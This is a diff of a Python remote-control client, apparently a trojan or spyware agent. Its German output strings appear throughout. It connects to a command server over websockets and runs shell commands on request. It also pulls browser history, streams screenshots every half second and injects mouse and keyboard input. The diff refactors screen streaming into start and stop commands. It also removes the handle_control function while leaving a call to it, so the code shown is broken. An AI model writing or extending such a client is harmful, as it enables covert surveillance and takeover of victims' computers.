@@ -1,56 +1,4 @@
 import asyncio
-
-async def screen_stream(ws):
-    import mss
-    import io
-    from PIL import Image
-    import base64
-    import asyncio
-    import pyautogui
-    sct = mss.mss()
-    monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
-    width, height = monitor['width'], monitor['height']
-    while True:
-        img = sct.grab(monitor)
-        # Convert to PIL Image
-        im = Image.frombytes('RGB', (img.width, img.height), img.rgb)
-        # Resize to reduce bandwidth if needed; here send full
-        buf = io.BytesIO()
-        im.save(buf, format='JPEG', quality=50)
-        img_bytes = buf.getvalue()
-        b64 = base64.b64encode(img_bytes).decode('utf-8')
-        try:
-            await ws.send_json({'action':'screen_frame','data':b64})
-        except Exception:
-            break
-        await asyncio.sleep(0.5)  # ~2 FPS
-
-async def handle_control(data):
-    import pyautogui
-    action = data.get('type')
-    # Normalize coords
-    width, height = pyautogui.size()
-    x_norm = data.get('x')
-    y_norm = data.get('y')
-    if x_norm is not None and y_norm is not None:
-        x = int(x_norm * width)
-        y = int(y_norm * height)
-    if action == 'mouse_move':
-        pyautogui.moveTo(x, y)
-    elif action == 'mouse_click':
-        button = data.get('button', 'left')
-        pyautogui.click(x, y, button=button)
-    elif action == 'mouse_down':
-        button = data.get('button', 'left')
-        pyautogui.mouseDown(x, y, button=button)
-    elif action == 'mouse_up':
-        button = data.get('button', 'left')
-        pyautogui.mouseUp(x, y, button=button)
-    elif action == 'key_press':
-        key = data.get('key')
-        if key:
-            pyautogui.press(key)
-
 import websockets
 import json
 import subprocess
@@ -60,7 +8,6 @@ import mss
 from PIL import Image
 import io
 import pyautogui
-
 import platform
 import sqlite3
 import shutil
@@ -354,14 +301,72 @@ def get_browser_history(limit=50):
     
     return "\n".join(output) if output else "Keine Browserverläufe gefunden."
 
+# --- Screen Streaming ---
+class ScreenStreamer:
+    def __init__(self):
+        self._task = None
+        self._running = False
+
+    async def start(self, ws):
+        if self._running:
+            return
+        self._running = True
+        self._task = asyncio.create_task(self._stream(ws))
+
+    async def stop(self):
+        self._running = False
+        if self._task:
+            self._task.cancel()
+            try:
+                await self._task
+            except Exception:
+                pass
+            self._task = None
+
+    async def _stream(self, ws):
+        sct = mss.mss()
+        monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
+        while self._running:
+            img = sct.grab(monitor)
+            im = Image.frombytes('RGB', (img.width, img.height), img.rgb)
+            buf = io.BytesIO()
+            im.save(buf, format='JPEG', quality=50)
+            img_bytes = buf.getvalue()
+            b64 = base64.b64encode(img_bytes).decode('utf-8')
+            try:
+                await ws.send(json.dumps({'action':'screen_frame','data':b64}))
+            except Exception:
+                break
+            await asyncio.sleep(0.5)
+
+screen_streamer = ScreenStreamer()
+
 # --- Hauptlogik ---
 async def process_commands(websocket):
-    async for message in websocket:
+    while True:
         try:
+            message = await websocket.recv()
             command = json.loads(message)
             action = command.get("action")
             response = {"status": "ok"}
-            
+
+            # --- Screen Streaming Steuerung ---
+            if action == "screenstream_start":
+                await screen_streamer.start(websocket)
+                response["type"] = "command_output"
+                response["output"] = "Screen-Streaming gestartet."
+                await websocket.send(json.dumps(response))
+                continue
+            elif action == "screenstream_stop":
+                await screen_streamer.stop()
+                response["type"] = "command_output"
+                response["output"] = "Screen-Streaming gestoppt."
+                await websocket.send(json.dumps(response))
+                continue
+            elif action == "control":
+                await handle_control(command)
+                continue
+
             if action == "exec":
                 cmd_to_run = command.get("command")
                 result = subprocess.run(
@@ -486,5 +491,3 @@ async def connect_to_server():
 
 if __name__ == "__main__":
     asyncio.run(connect_to_server())
-# Start screen streaming when connected
-asyncio.get_event_loop().create_task(screen_stream(websocket))
